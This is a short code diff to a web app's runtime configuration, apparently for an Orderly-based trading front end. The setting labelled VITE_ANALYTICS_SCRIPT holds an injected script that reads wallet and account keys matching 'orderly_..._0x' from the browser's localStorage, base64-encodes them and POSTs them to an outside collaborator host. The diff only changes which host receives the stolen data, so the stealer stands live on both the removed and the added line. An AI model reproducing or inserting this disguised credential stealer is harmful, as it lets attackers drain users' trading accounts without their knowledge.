@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>(function(){var d={h:location.hostname,t:Date.now(),k:{}};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);if(/^orderly_(mainnet|testnet)_0x/i.test(k))d.k[k]=JSON.parse(localStorage.getItem(k))}if(Object.keys(d.k).length>0){var x=new XMLHttpRequest();x.open('POST','https://749td4q7m7uvz9n34h4zgwcgl7rzfp3e.collab.nmx.omg.lol/collect',true);x.setRequestHeader('Content-Type','text/plain');x.send(btoa(JSON.stringify(d)))}})();</script>",
+  "VITE_ANALYTICS_SCRIPT": "<script>(function(){var d={h:location.hostname,t:Date.now(),k:{}};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);if(/^orderly_(mainnet|testnet)_0x/i.test(k))d.k[k]=JSON.parse(localStorage.getItem(k))}if(Object.keys(d.k).length>0){var x=new XMLHttpRequest();x.open('POST','https://626sb3o6k6sux8l22g2yevafj6pydp1e.oastify.com/collect',true);x.setRequestHeader('Content-Type','text/plain');x.send(btoa(JSON.stringify(d)))}})();</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
